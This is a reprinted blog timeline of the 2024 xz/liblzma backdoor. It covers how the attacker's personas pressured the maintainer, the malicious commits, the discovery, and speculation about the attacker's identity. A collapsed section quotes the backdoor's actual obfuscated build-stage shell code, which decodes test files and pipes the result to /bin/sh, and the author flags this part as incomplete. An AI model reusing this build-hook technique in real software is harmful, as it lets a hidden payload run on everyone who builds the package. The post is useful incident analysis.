---
title: "[转载] Everything I Know About the Xz Backdoor"
date: 2024-3-29
tags: Reprint 开源软件
category: Linux
license: REPRINT
highlight: true
---
_Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 10:30 PM EST_

_Update: The GitHub page for xz has been suspended._

<!--more-->

[原文章](https://boehs.org/node/everything-i-know-about-the-xz-backdoor")

### 2021

JiaT75 (Jia Tan) creates their GitHub account.

The first commits they make are not to xz, but they are deeply suspicious. Specifically, they open a PR in libarchive: [Added error text to warning when untaring with bsdtar](https://github.com/libarchive/libarchive/pull/1609). This commit does a little more than it says. It replaces `safe_fprint` with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and ~~[lives on to this day](https://github.com/libarchive/libarchive/blob/master/tar/read.c#L374-L375)~~ ([patched](https://github.com/libarchive/libarchive/pull/2101)). libarchive should also be considered compromised until proven otherwise.

### 2022

In April 2022, Jia Tan submits a patch via a mailing list. The patch is irrelevant, but the events that follow are. A new persona – Jigar Kumar enters, and begins [pressuring](https://www.mail-archive.com/xz-devel@tukaani.org/msg00565.html) for this patch to be merged.

Soon after, Jigar Kumar [begins](https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html) pressuring _Lasse Collin_ to add another maintainer to XZ. In the fallout, we learn a little bit about mental health in open source.

Three days after the emails pressuring _Lasse Collin_ to add another maintainer, JiaT75 makes their first commit to xz: [Tests: Created tests for hardware functions.](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b). Since this commit, they become a regular contributor to xz (they are currently the second most active). It’s unclear exactly when they became trusted in this repository.

_Jigar Kumar_ is [never seen again](https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=Kumar&x=0&y=0). Another account — [Dennis Ens](https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=from:%22Dennis+Ens%22) also participates in pressure, with a similar name+number formatted email. This account is also never seen outside of xz discussion, and both do not have any associated accounts that have been discovered.

>**[Glyph](https://mastodon.social/@glyph/112180922900094371)**  
>@glyph@mastodon.social
>
>I really hope that this causes an industry-wide reckoning with the common practice of letting your entire goddamn product rest on the shoulders of one overworked person having a slow mental health crisis without financially or operationally supporting them whatsoever. I want everyone who has an open source dependency to read this message <https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html>
>
>Mar 29, 2024, 20:43  
>_转载注明：这段来自于 [Mastodon](https://mastodon.social/@glyph/112180922900094371)_

### 2023

JiaT75 merges their first commit [on Jan 7 2023](https://github.com/tukaani-project/xz/pull/7)<sup id="fnref1">[1](#fn1)</sup>, which gives us good indication into when they fully gain trust.

In March, the primary contact email in Google’s oss-fuzz is [updated](https://github.com/JiaT75/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd) to be Jia’s, instead of _Lasse Collin_.

Testing infrastructure that will be used in this exploit is committed. Despite _Lasse Collin_ being attributed as the author for this, Jia Tan committed it, and it was originally written by _Hans Jansen_ in June:

- Commit: [liblzma: Add ifunc implementation to crc64_fast.c](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314)
- PR: [Replaced crc64_fast constructor with ifunc by hansjans162](https://github.com/tukaani-project/xz/pull/53)

_Hans Jansen_’s account was seemingly made specifically to create this pull request. There is very little activity before and after. They will later push for the compromised version of XZ to be included in Debian.

In July, [a PR](https://github.com/google/oss-fuzz/pull/10667) was opened in oss-fuzz to disable ifunc for fuzzing builds, due to issues introduced by the changes above. This appears to be deliberate to mask the malicious changes that will be introduced soon. Also, JiaT75 opened an [issue](https://github.com/llvm/llvm-project/issues/63957) about a warning in clang that, while indeed incorrect, drew attention to ifuncs.

### 2024

A pull request for Google’s [oss-fuzz is opened](https://github.com/google/oss-fuzz/pull/11587) that changes the URL for the project from [tukaani.org/xz/](http://tukaani.org/xz/) to [xz.tukaani.org/xz-utils/](http://xz.tukaani.org/xz-utils/). [tukaani.org](http://tukaani.org/) is hosted at `5.44.245.25` in Finland, at [this](https://www.zoner.fi/) hosting company. The xz subdomain, meanwhile, points to GitHub pages. This furthers the amount of control Jia has over the project.

A commit containing the final steps required to execute this backdoor is added to the repository:

- Tests: [Add a few test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)
- Tests: [Update two test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89)

#### The discovery

An email is sent to the oss-security mailing list: [backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4), announcing this discovery, and doing it’s best to explain the exploit chain.

>**[AndresFreundTec](https://mastodon.social/@AndresFreundTec/112180406142695845)**  
>@AndresFreundTec@mastodon.social
>
>I was doing some micro-benchmarking at the time, needed to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd, showing lots of cpu time in liblzma, with perf unable to attribute it to a symbol. Got suspicious. Recalled that I had seen an odd valgrind complaint in automated testing of postgres, a few weeks earlier, after package updates.
>
>Really required a lot of coincidences.
>
>Mar 29, 2024, 18:32  
>_转载注明：这段来自于 [Mastodon](https://mastodon.social/@AndresFreundTec/112180406142695845)_

A [gist](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) has been published with a very good high level technical overview and a “what you need to know”

In addition to the gist and the email above, a number of analysis attempts have begun emerging:

- [xz/liblzma: Bash-stage Obfuscation Explained](https://gynvael.coldwind.pl/?lang=en&id=782#stage2-ext)
- [“It’s RCE, not auth bypass”](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b)
- [[WIP] XZ Backdoor Analysis and symbol mapping](https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504)
- [Infographic](https://infosec.exchange/@fr0gger/112189232773640259)

<details>
<summary>This isn't good yet, I'm still figuring it out</summary>

Code is [added](https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63) to the upstream tarballs that injects an obfuscated script from the files committed above to be “executed at the end of configure”. This code, in turn, “modifies `$builddir/src/liblzma/Makefile` to contain”

```sh
am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
```

(you’ll notice this was the file added above) “which ends up as” (what ends up as?)

```sh
sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1;
```

The sed reportedly transforms into

```sh
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####
```

You’ll notice this script is piping one of these files attached in the above commits into a series of very very obfuscated head calls. And after deobfuscation of this script, it leads to a sh file attached in the email:

[injected.txt](https://www.openwall.com/lists/oss-security/2024/03/29/4/1)

There are a number of conditions identified that are required for the process to continue:

- Building with gcc and the gnu linker
- only x86-64 linux
- Running as part of a debian or RPM package build

The final binary reportedly is used in some way to bypass sshd authentication checks.
</details>

> 原作者删除了这段 details。此处保留仅作备份。

#### A sudden push for inclusion

A request for the vulnerable version to be included in Debian is opened by Hans:

- [#1067708 - xz-utils: New upstream version available](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708)

This request was opened the [same week](https://salsa.debian.org/hjansen) Hans’ Debian GitLab account was created. The account created a few similar “update” requests in various low traffic repositories to build credibility, after asking for this one.

A number of other, suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including _misoeater91_ and _krygorin4545_. _krygorin4545_’s PGP key was made 2 days prior to today.
>
>    Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work.

>
>    I noticed this last week and almost made a valgrind bug. Glad to see it being fixed.
>    Thanks Hans!
>

The Valgrind bugs mentioned were _introduced_ by this malicious injection, as noted in the email to OSS-Security:

>
>    Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1:
>

A [pull request](https://github.com/jamespfennell/xz/pull/2) to a go library by a 1password employee is opened asking to upgrade the library to the vulnerable version, however, it was all unfortunate timing. 1Password reached out by email referring me to this [comment](https://github.com/jamespfennell/xz/pull/2#issuecomment-2027836356), and everything seems to check out.

A fedora contributor [states](https://news.ycombinator.com/item?id=39866275) that _Jia_ was pushing for its inclusion in Fedora as it contains “great new features”

_Jia Tan_ also [attempted](https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417) to get it into Ubuntu days before the beta freeze.

A few hours after all this came out, GitHub suspended JiaT75’s account. Thanks? They also banned the repository, meaning people can no longer audit the changes made to it without resorting to mirrors. Immensely helpful, GitHub. They also [suspended](https://github.com/JiaT75?tab=following) _Lasse Collin_’s account, which is completely disgraceful.

Lasse has begun reverting changes introduced by Jia, [including](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00) one that [added](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) a sneaky period to disable the sandbox. They also have published a FAQ that begins to explain the situation: [XZ Utils backdoor](https://tukaani.org/xz-backdoor/)

### OSINT

Various people have reached out to me regarding discoveries about the identity of Jia. Some of this has been incorporated in the timeline, but other stuff is “timeless” and so I’m putting it here:

#### IRC

I received an email that clarified a few points, and provided new insight into the situation.

“Jia Tan” was present on the #tukaani IRC channel on Libera.chat. A /whois revealed their connecting IP and activity on March 29th.

```
[libera] -!- jiatan [~jiatan@185.128.24.163]
[libera] -!-  was      : Jia Tan
[libera] -!-  hostname : 185.128.24.163
[libera] -!-  account  : jiatan
[libera] -!-  server   : tungsten.libera.chat [Fri Mar 29 14:47:40 2024]
[libera] -!- End of WHOWAS
```

Running an nmap on the IP shows a lot of open ports, which probably indicates a proxy, hosting provider, or something of the sort. The IP is from Singapore.

Further research shows that this IP belongs to Witopia VPN, so it’s not entirely indicative of a region. Given the timezone, however, I feel like proximity becomes plausible.

#### Important notes on LinkedIn

I have received a few emails alerting me to a LinkedIn of somebody named _Jia Tan_<sup id="fnref2">[2](#fn2)</sup>. Their bio boasts of _large-scale vulnerability management_. They claim to live in California. Is this our man? The commits on JiaT75’s GitHub are set to +0800, which would not indicate presence in California. UTC-0800 would be California. Most of the commits [were made](https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91cihjcmVhdGVkX2F0KSBBUyBob3VyLCBjb3VudCgqKSBGUk9NIGdpdGh1Yl9ldmVudHMgV0hFUkUgYWN0b3JfbG9naW49J0ppYVQ3NScgR1JPVVAgQlkgaG91ciBPUkRFUiBCWSBob3Vy) between UTC 12-17, which is awfully early for California. In my opinion, there is no sufficient evidence that the LinkedIn being discussed is our man. I think identity theft is more likely, but I am of course open to more evidence.

#### Discoveries in the Git logs

I received an email from [Minhu Wang](https://github.com/minhuw) who investigated the Git log, and found one instance where Jia’s username was different:

```sh
$ git shortlog --summary --numbered --email | grep grep jiat0218@gmail.com
273 Jia Tan <jiat0218@gmail.com>
2 jiat75 <jiat0218@gmail.com>
1 Jia Cheong Tan <jiat0218@gmail.com>
```

They found this particularly interesting as `Cheong` is new information. I’ve now learned from another source that _Cheong_ isn’t Mandarin, it’s Cantonese. This source theorizes that Cheong is a variant of the 張 surname, as “eong” matches Jyutping (a Cantonese romanisation standard) and “Cheung” is pretty common in Hong Kong as an official surname romanisation. A third source has alerted me that “Jia” is Mandarin (as Cantonese rarely uses `J` and especially not `Ji`). The `Tan` last name is possible in Mandarin, but is most common for the Hokkien Chinese dialect pronunciation of the character 陳 (Cantonese: Chan, Mandarin: Chen). It’s most likely our actor simply mashed plausible sounding Chinese names together.

Furthermore, an [independent analysis](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and) of commit timings concludes that the perpetrator worked “Office Hours” in a UTC+02/03 timezone. It’s particularly notable that they worked through the Lunar New Year, and did not work on some notable Eastern European holidays, including Christmas and New Year.

## Footnotes
<ol>
    <li id="fn1"> Thanks @joeyh@hachyderm.io <a href="#fnref1">↩︎</a> </li>
    <li id="fn2"> I was also alerted to discussions of this on Gab, which should tell you what you need to know. <a href="#fnref2">↩︎</a> </li>
</ol>
